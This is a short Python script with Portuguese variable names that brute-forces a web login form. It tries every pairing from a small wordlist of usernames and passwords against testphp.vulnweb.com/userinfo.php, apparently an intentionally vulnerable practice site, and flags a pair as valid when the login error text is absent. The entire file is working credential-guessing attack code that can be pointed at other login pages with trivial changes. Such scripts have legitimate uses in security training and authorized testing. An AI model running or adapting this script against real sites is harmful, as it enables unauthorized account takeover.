import requests
import re

usuarios_senhas = ['admin', 'administrador', 'test', 'login']
mensagem_err = 'If you are already registered please enter your login information below:'

for usuario in usuarios_senhas:
    for senha in usuarios_senhas:
        requisicao = requests.post(
            'http://testphp.vulnweb.com/userinfo.php', data={'uname': usuario, 'pass': senha})
        
        try:
            if re.findall(mensagem_err, requisicao.text)[0]:
                print(f'[-] usuario e senha incorretas: {usuario}:{senha}')
        except IndexError as e:
            print(f'[+] usuario e senha corretas: {usuario}:{senha}')
